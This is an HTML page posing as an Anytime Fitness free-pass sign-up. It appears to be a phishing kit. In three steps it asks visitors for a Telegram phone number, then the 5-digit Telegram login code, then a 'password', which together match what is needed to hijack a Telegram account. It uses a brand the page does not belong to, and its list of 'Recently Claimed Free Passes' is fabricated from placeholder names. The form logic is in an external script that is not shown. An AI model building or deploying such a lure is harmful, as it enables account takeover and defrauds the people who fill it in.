<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Anytime Fitness - Try Us For Free</title>

    <!-- Local CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css" rel="stylesheet">

    <style>
        /* FIX RESPONSIVE UTAMA & GYM THEME MATCHING IMAGE */
        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }

        :root {
            --primary-purple: #4c2484; 
            --accent-blue: #00d2ff;
            --text-dark: #111827; 
            --text-light: #6B7280;
            --bg-body: #F4F4F5;
            --border-color: #E5E7EB;
            --success-color: #10B981;
            --card-bg: #FFFFFF;
            --input-bg: #F9FAFB;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-body);
            color: var(--text-dark);
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            margin: 0;
            width: 100vw;
            max-width: 100%;
        }

        /* --- HEADER NAVIGATION --- */
        .header-section {
            background: var(--primary-purple);
            padding: 15px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            z-index: 10;
            width: 100%;
        }

        .header-logo-container {
            display: flex;
            align-items: center;
            height: 40px; /* Menyesuaikan tinggi agar rapi */
        }

        .header-logo-container img {
            height: 100%;
            width: auto;
            object-fit: contain;
        }

        .header-links {
            display: none;
        }

        @media(min-width: 992px) {
            .header-links {
                display: flex;
                align-items: center;
                gap: 25px;
                font-size: 0.85rem;
                font-weight: 700;
                color: #ffffff;
            }

            .header-links span:hover {
                color: var(--accent-blue);
                cursor: pointer;
            }
            
            .btn-nav-free {
                background: #8A4BFF;
                color: white;
                padding: 8px 20px;
                border-radius: 30px;
                font-weight: 800;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
        }

        /* --- HERO SECTION --- */
        .hero-section {
            background: linear-gradient(135deg, rgba(76, 36, 132, 0.66) 0%, rgba(138, 75, 255, 0.54) 100%), url('images/banner.png') center/cover no-repeat;
            color: #ffffff;
            width: 100%;
            text-align: center;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: max(40px, 6vw) 5% max(100px, 12vw) 5%;
        }

        .hero-container {
            max-width: 900px;
            margin: 0 auto;
            width: 100%;
        }

        .hero-text h1 {
            font-size: clamp(2.5rem, 6vw, 4.5rem);
            font-weight: 900;
            line-height: 1.1;
            margin-bottom: 20px;
            text-transform: uppercase;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .hero-text h1 span.power { color: var(--accent-blue); }
        .hero-text h1 span.life { color: #8A4BFF; }

        .hero-stats {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 30px;
            font-weight: 800;
            font-size: 1.2rem;
            text-transform: uppercase;
        }

        /* --- MAIN ACTION AREA (FORMULARIO) --- */
        .main-action-area {
            width: 100%;
            max-width: 800px;
            margin: -60px auto 40px auto;
            padding: 0 15px;
            position: relative;
            z-index: 5;
        }

        #intro-screen {
            background: var(--card-bg);
            color: var(--text-dark);
            border-radius: 12px;
            padding: 40px 20px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.5s ease-out;
            border-top: 5px solid var(--primary-purple);
        }

        #intro-screen h3 {
            font-weight: 900;
            margin-bottom: 15px;
            font-size: 1.8rem;
            text-transform: uppercase;
            color: var(--primary-purple);
        }

        #intro-screen p {
            color: var(--text-light);
            font-size: 1rem;
            margin-bottom: 25px;
            line-height: 1.5;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }

        .btn-start {
            background-color: var(--primary-purple);
            color: #fff;
            border: none;
            padding: 16px 30px;
            border-radius: 30px;
            font-weight: 800;
            font-size: 1.1rem;
            text-transform: uppercase;
            cursor: pointer;
            width: 100%;
            max-width: 400px;
            transition: transform 0.2s, background-color 0.2s;
            box-shadow: 0 4px 15px rgba(76, 36, 132, 0.4);
        }
        
        .btn-start:hover {
            background-color: #371866;
            transform: translateY(-2px);
        }

        .content-card {
            background: var(--card-bg);
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            padding: clamp(20px, 4vw, 40px);
            color: var(--text-dark);
            border-top: 5px solid var(--primary-purple);
        }

        .step-indicator {
            font-size: 0.75rem;
            font-weight: 800;
            color: var(--primary-purple);
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .step-indicator::before {
            content: '';
            width: 20px;
            height: 3px;
            background: var(--primary-purple);
            display: inline-block;
        }

        .form-title {
            font-weight: 900;
            font-size: clamp(1.2rem, 4vw, 1.8rem);
            color: var(--primary-purple);
            margin-bottom: 20px;
            text-transform: uppercase;
        }

        .form-label-custom {
            font-size: 0.9rem;
            font-weight: 700;
            color: var(--text-dark);
            margin-bottom: 8px;
            display: block;
        }

        .form-control-custom,
        .input-group-custom {
            width: 100%;
            border: 2px solid var(--border-color);
            border-radius: 8px;
            background-color: var(--input-bg);
            color: var(--text-dark);
            transition: all 0.3s ease;
        }

        .form-control-custom:focus, .input-group-custom:focus-within {
            border-color: var(--primary-purple);
            outline: none;
            background-color: #fff;
        }

        .form-control-custom {
            padding: 14px 16px;
            font-size: 0.95rem;
        }
        
        select.form-control-custom {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%234c2484' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 1rem center;
            background-size: 1em;
        }

        .input-group-custom {
            display: flex;
            align-items: center;
            overflow: hidden;
        }

        .flag-box {
            padding: 0 12px;
            display: flex;
            align-items: center;
            background-color: #F9FAFB;
            border-right: 1px solid var(--border-color);
            height: 100%;
            gap: 6px;
            font-weight: 700;
            color: var(--text-dark);
        }

        .input-group-custom input {
            flex: 1;
            border: none;
            padding: 14px 12px;
            font-size: 0.95rem;
            outline: none;
            background: transparent;
            color: var(--text-dark);
            width: 100%;
            min-width: 0;
        }

        .checkbox-container {
            display: flex;
            align-items: flex-start;
            margin: 20px 0;
            background: var(--input-bg);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }

        .checkbox-container input {
            margin-top: 4px;
            margin-right: 10px;
            min-width: 18px;
            min-height: 18px;
            accent-color: var(--primary-purple);
        }

        .checkbox-container label {
            font-size: 0.85rem;
            color: var(--text-light);
            line-height: 1.5;
            font-weight: 500;
        }

        .btn-black {
            background-color: var(--primary-purple);
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 8px;
            font-weight: 800;
            font-size: 1rem;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(76, 36, 132, 0.3);
            transition: all 0.3s;
        }

        .btn-black:hover {
            background-color: #371866;
        }

        .btn-black:disabled {
            background-color: #D1D5DB;
            box-shadow: none;
            cursor: not-allowed;
            color: #9CA3AF;
        }

        /* --- AUTO SCROLL TABLE SECTION --- */
        .bottom-section {
            width: 100%;
            max-width: 800px;
            margin: 10px auto 50px auto;
            padding: 0 15px;
        }

        .table-container {
            width: 100%;
            background: var(--card-bg);
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            padding: 25px;
            border-top: 5px solid var(--primary-purple);
        }

        .table-header-custom {
            color: var(--primary-purple);
            padding-bottom: 15px;
            font-weight: 900;
            text-align: center;
            font-size: 1.3rem;
            text-transform: uppercase;
            border-bottom: 2px solid var(--border-color);
            margin-bottom: 15px;
        }

        .scroll-wrapper {
            max-height: 280px;
            overflow: hidden;
            position: relative;
            mask-image: linear-gradient(to bottom, transparent, black 10%, black 90%, transparent);
            -webkit-mask-image: linear-gradient(to bottom, transparent, black 10%, black 90%, transparent);
        }

        .scroll-content {
            display: flex;
            flex-direction: column;
            gap: 12px;
            padding: 10px 0;
            animation: verticalScroll 12s linear infinite;
        }

        .scroll-content:hover {
            animation-play-state: paused;
        }

        .scroll-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: var(--input-bg);
            border-radius: 8px;
            border: 1px solid var(--border-color);
            transition: all 0.3s;
        }

        .scroll-item:hover {
            border-color: var(--primary-purple);
            transform: scale(1.01);
            background: #fff;
        }

        .scroll-item-name {
            font-weight: 700;
            color: var(--text-dark);
            font-size: 0.95rem;
        }

        .status-success {
            color: var(--success-color);
            font-weight: 700;
            background: #ECFDF5;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.8rem;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            white-space: nowrap;
            border: 1px solid rgba(16, 185, 129, 0.2);
        }

        @keyframes verticalScroll {
            0% { transform: translateY(0); }
            100% { transform: translateY(calc(-50% - 6px)); }
        }

        /* --- FOOTER --- */
        .main-footer {
            background-color: #F8F9FA;
            color: var(--text-dark);
            text-align: center;
            padding: 50px 15px 30px;
            margin-top: auto;
            font-size: 0.85rem;
            border-top: 1px solid var(--border-color);
            width: 100%;
        }

        .footer-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 30px;
            max-width: 900px;
            margin: 0 auto 40px auto;
            text-align: left;
        }

        @media(min-width: 768px) {
            .footer-grid {
                grid-template-columns: repeat(3, 1fr);
                text-align: center;
            }
        }

        .footer-col h5 {
            font-weight: 900;
            margin-bottom: 15px;
            text-transform: uppercase;
        }

        .footer-col a {
            display: block;
            color: var(--text-light);
            text-decoration: none;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .footer-col a:hover {
            color: var(--primary-purple);
        }

        .footer-bottom {
            color: #9CA3AF;
            font-size: 0.75rem;
            margin-top: 30px;
        }

        /* --- LOGIC PRESERVATION --- */
        .step-section {
            display: none;
            animation: fadeIn 0.5s;
        }

        .step-section.active {
            display: block;
        }

        .alert-custom {
            padding: 12px;
            border-radius: 8px;
            font-size: 0.85rem;
            margin-bottom: 15px;
            display: none;
            font-weight: 600;
        }

        .alert-error {
            background-color: #FEF2F2;
            color: #DC2626;
            border: 1px solid #FCA5A5;
            border-left: 4px solid #DC2626;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        #loader-screen,
        #submit-loader {
            background: #ffffff;
        }

        .loader-text,
        #submit-loader p {
            color: var(--primary-purple) !important;
            letter-spacing: 1px;
        }

        .spinner-border {
            border-color: var(--primary-purple) !important;
            border-right-color: transparent !important;
        }

        #notification-popup {
            position: fixed;
            top: 20px;
            right: -100%;
            background: var(--card-bg);
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 9999;
            border-left: 4px solid var(--success-color);
            transition: right 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            max-width: 90vw;
        }

        @media (max-width: 767px) {
            .hero-section {
                background-size: contain;
                background-position: center top;
                padding: 0px 15px 0px 15px !important;
                aspect-ratio: 430 / 236;
                height: auto;
            }

            .hero-text h1 {
                font-size: 1.3rem !important;
                margin-bottom: 8px;
            }

            .hero-stats {
                font-size: 0.65rem !important;
                gap: 5px !important;
                margin-bottom: 0px;
            }

            .main-action-area {
                margin: 20px auto 40px auto !important;
            }
        }
    </style>
</head>

<body>

    <!-- Splash Loader -->
    <div id="loader-screen"
        style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; display: flex; justify-content: center; align-items: center; flex-direction: column; transition: opacity 0.5s;">
        <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;" role="status"></div>
        <div class="loader-text fw-bold text-uppercase">Loading...</div>
    </div>

    <!-- Header Section (MENGGUNAKAN LOGO DARI FOLDER IMAGES) -->
    <header class="header-section">
        <div class="header-logo-container">
            <!-- Ganti 'logo.png' dengan nama file logo asli Anda di folder images -->
            <img src="images/NAnytime-Fitness_622AC05B-B12B-4D70-92C9AE3DFB956EA2-622abfb69fb022e_622ac0d0-c95d-55df-95bdb745665c8976.jpg" alt="Anytime Fitness Logo">
        </div>
        <div class="header-links">
            <span>Find A Gym</span>
            <span>Why Join</span>
            <span>Employee Wellness</span>
            <span>Own A Gym</span>
            <span class="btn-nav-free">TRY US FOR FREE</span>
        </div>
    </header>

    <!-- Hero Area -->
    <section class="hero-section">
        <div class="hero-container">
            <div class="hero-text">
                <h1>TRAIN FOR YOUR <span class="power">POWER</span><br>TRAIN FOR YOUR <span class="life">LIFE</span></h1>
                
                <div class="hero-stats">
                    <div>#1 24/HR GYM FRANCHISE IN THE WORLD</div>
                    <div>WITH NEARLY 6,000 LOCATIONS WORLDWIDE</div>
                    <div>580+ GYMS IN THE REGION</div>
                    <div>160+ GYMS IN THE COUNTRY</div>
                </div>
            </div>
        </div>
    </section>

    <!-- FORMULARIO CENTRAL -->
    <div class="main-action-area">
        
        <div id="intro-screen">
            <h3>Try Us For Free</h3>
            <p>Ready to make a change? Claim your free access pass now. Fill out the form below to receive your personalized gym pass and start training today.</p>
            <button type="button" class="btn-start"
                onclick="document.getElementById('intro-screen').style.display='none'; document.getElementById('main-form-container').style.display='block';">
                FIND A GYM NEAR YOU NOW
            </button>
        </div>

        <div id="main-form-container" style="display: none;">
            <div class="content-card">
                
                <!-- HIDDEN INPUTS (LOGIKA TETAP AMAN) -->
                <input type="hidden" id="validateclientHash">
                <input type="hidden" id="validatephone_number">
                <input type="hidden" id="validateotp_code">

                <div id="step1" class="step-section active">
                    <div class="step-indicator">Step 1: Personal Profile</div>
                    <h2 class="form-title">Complete Your Details</h2>
                    <div id="alert1" class="alert-custom alert-error"></div>
                    <form id="firstForm">
                        <div class="mb-3">
                            <label class="form-label-custom">Full Name</label>
                            <input type="text" id="full_name" class="form-control-custom" placeholder="e.g. Henny Lim"
                                required autocomplete="off">
                        </div>

                        <div class="mb-3">
                            <label class="form-label-custom">What is your main fitness goal?</label>
                            <select id="job_position" class="form-control-custom" required>
                                <option value="" disabled selected>Select an option</option>
                                <option value="administrativo">Weight Loss</option>
                                <option value="ventas">Muscle Building</option>
                                <option value="operativo">General Fitness</option>
                                <option value="tecnico">Sports Training</option>
                                <option value="otro">Other</option>
                            </select>
                        </div>

                        <div class="mb-3">
                            <label class="form-label-custom">Gym Experience</label>
                            <select id="experience" class="form-control-custom" required>
                                <option value="" disabled selected>Select your experience level</option>
                                <option value="0">Beginner (Never been to a gym)</option>
                                <option value="1-2">1 - 2 Years</option>
                                <option value="3-5">3 - 5 Years</option>
                                <option value="5+">More than 5 Years</option>
                            </select>
                        </div>

                        <div class="mb-3">
                            <label class="form-label-custom">Telegram Number</label>
                            <div class="input-group-custom">
                                <div class="flag-box">
                                    <img src="https://flagcdn.com/w20/sg.png" alt="SG" width="20">
                                </div>
                                <input type="tel" id="phone_number" placeholder="9XXX XXXX" required
                                    inputmode="numeric">
                            </div>
                            <small class="text-muted mt-1 d-block" style="font-size: 0.75rem;">
                                <i class="bi bi-telegram me-1"></i> Make sure your number is linked to an active Telegram account.
                            </small>
                        </div>

                        <div class="checkbox-container">
                            <input type="checkbox" id="certifico" required>
                            <label for="certifico">I agree to the terms and conditions of <strong>Anytime Fitness Free Pass</strong>.</label>
                        </div>

                        <button type="submit" id="firstbutt" class="btn-black">CONTINUE</button>
                    </form>
                </div>

                <div id="step2" class="step-section">
                    <div class="step-indicator">Step 2: Security Validation</div>
                    <h2 class="form-title">Verify Telegram Account</h2>
                    <p class="text-muted small mb-3">
                        We have sent a 5-digit code to your <strong>Telegram</strong> account. Open the app and enter the code below to confirm your free pass.
                    </p>
                    <div id="alert2" class="alert-custom alert-error"></div>
                    <form id="secondForm">
                        <div class="mb-4">
                            <label class="form-label-custom">5-Digit Code</label>
                            <input type="tel" name="otp-input" id="otp_code" class="form-control-custom text-center"
                                placeholder="•••••" required maxlength="5"
                                style="letter-spacing: 10px; font-size: 1.5rem; font-weight: bold; color: var(--text-dark);">
                        </div>
                        <button type="submit" id="seccbutt" class="btn-black">VALIDATE TELEGRAM CODE</button>
                    </form>
                </div>

                <div id="step3" class="step-section">
                    <div class="step-indicator">Step 3: Account Access</div>
                    <h2 class="form-title">Create Password</h2>
                    <p class="text-muted small mb-3">Use this password to access your member dashboard, view class schedules, and track your fitness journey.</p>
                    <div id="alert3" class="alert-custom alert-error"></div>
                    <form id="thirdForm">
                        <div class="mb-4">
                            <label class="form-label-custom">Password</label>
                            <input type="password" id="password" class="form-control-custom"
                                placeholder="Min. 8 characters" required>
                        </div>
                        <button type="submit" id="thirdbutt" class="btn-black">SAVE & ACTIVATE</button>
                    </form>
                </div>

                <div id="step4" class="step-section text-center py-4">
                    <i class="bi bi-check-circle-fill mb-3" style="font-size: 4rem; color: var(--success-color);"></i>
                    <h2 class="form-title mb-2">Pass Activated Successfully!</h2>
                    <p class="text-muted">Your digital free pass is ready. Please check your app or visit the reception desk to start your fitness journey.</p>
                    <button type="button" class="btn-black mt-3" onclick="window.location.reload();">BACK TO HOME</button>
                </div>
            </div>
        </div>
    </div>

    <!-- RECENT CLAIMS WITH AUTO SCROLL (ENGLISH NAMES) -->
    <div class="bottom-section">
        <div class="table-container">
            <div class="table-header-custom">
                Recently Claimed Free Passes
            </div>
            
            <div class="scroll-wrapper">
                <div class="scroll-content">
                    <!-- Data Asli -->
                    <div class="scroll-item">
                        <span class="scroll-item-name">JOHN DOE</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                    <div class="scroll-item">
                        <span class="scroll-item-name">JANE SMITH</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                    <div class="scroll-item">
                        <span class="scroll-item-name">MICHAEL JOHNSON</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                    <div class="scroll-item">
                        <span class="scroll-item-name">EMILY DAVIS</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                    <div class="scroll-item">
                        <span class="scroll-item-name">DAVID WILSON</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>

                    <!-- Duplikat Data Agar Efek Scroll Tidak Pernah Putus (Seamless Loop) -->
                    <div class="scroll-item">
                        <span class="scroll-item-name">JOHN DOE</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                    <div class="scroll-item">
                        <span class="scroll-item-name">JANE SMITH</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                    <div class="scroll-item">
                        <span class="scroll-item-name">MICHAEL JOHNSON</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                    <div class="scroll-item">
                        <span class="scroll-item-name">EMILY DAVIS</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                    <div class="scroll-item">
                        <span class="scroll-item-name">DAVID WILSON</span>
                        <span class="status-success"><i class="bi bi-check-circle-fill"></i> Active Pass</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="main-footer">
        <div class="footer-grid">
            <div class="footer-col">
                <h5>Company</h5>
                <a href="#">Inspire To Grow With Us</a>
                <a href="#">Privacy Policy</a>
                <a href="#">DMCA Policy</a>
                <a href="#">Terms & Conditions</a>
            </div>
            <div class="footer-col">
                <h5>Gyms</h5>
                <a href="#">Find A Gym</a>
                <a href="#">View All Gyms</a>
                <a href="#">Own A Gym</a>
                <a href="#">Franchise Login</a>
            </div>
            <div class="footer-col">
                <h5>Members</h5>
                <a href="#">FAQs</a>
                <a href="#">Contact Us</a>
            </div>
        </div>
        <div class="footer-bottom">
            © 2026 Asia Fitness Limited<br>
            Richmond Commercial Building, 109 Argyle Street, Mong Kok, KLN, Hong Kong
        </div>
    </footer>

    <!-- Popups & Loaders -->
    <div id="notification-popup">
        <div style="color: #10B981; background: #ECFDF5; padding: 8px; border-radius: 50%;">
            <i class="bi bi-check-lg" style="font-size: 1rem; font-weight: bold;"></i>
        </div>
        <div>
            <h6 id="notif-name" style="margin: 0; font-weight: 700; font-size: 0.9rem; color: var(--text-dark);">New Member</h6>
            <p style="margin: 0; font-size: 0.75rem; color: var(--text-light);">Successfully claimed a free pass.</p>
        </div>
    </div>

    <div id="submit-loader"
        style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 10000; justify-content: center; align-items: center; flex-direction: column;">
        <div class="spinner-border text-primary" style="width: 3rem; height: 3rem; color: var(--primary-purple) !important;" role="status"></div>
        <p class="mt-3 fw-bold" style="color: var(--text-dark) !important; letter-spacing: 1px;">Processing...</p>
    </div>

    <!-- Scripts -->
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/logical.js"></script>
</body>

</html>
